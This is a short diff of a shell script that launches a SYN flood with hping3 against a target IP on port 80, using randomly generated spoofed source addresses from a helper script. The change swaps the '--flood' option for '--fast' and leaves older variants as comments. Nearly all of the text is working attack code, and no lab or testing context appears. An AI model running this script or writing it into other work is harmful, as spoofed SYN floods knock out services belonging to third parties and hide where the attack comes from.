@@ -8,17 +8,16 @@ if [ "" = "$OK" ]; then
   sudo apt-get install $REQUIRED
 fi
 
-# Pull IP from the .env
-#echo "Input IP Address:"
-#read IP
-
 #echo "Input Spoof IP Address:"
 #read SPOOF
 SPOOF=$(python ./randip.py)
 
+# Use --flood instead of --fast
+# sudo hping3 --fast -S $IP -a $SPOOF -p 80
+# hping3 $IP -a $(python3 ./randip.py) -p 80 -S --fast
 echo "Executing SYN Flood ..."
 flood () {
-  sudo hping3 --flood $IP -a $SPOOF -S -p 80
+  sudo hping3 $IP -a $SPOOF -p 80 -S --fast
 }
 
 flood
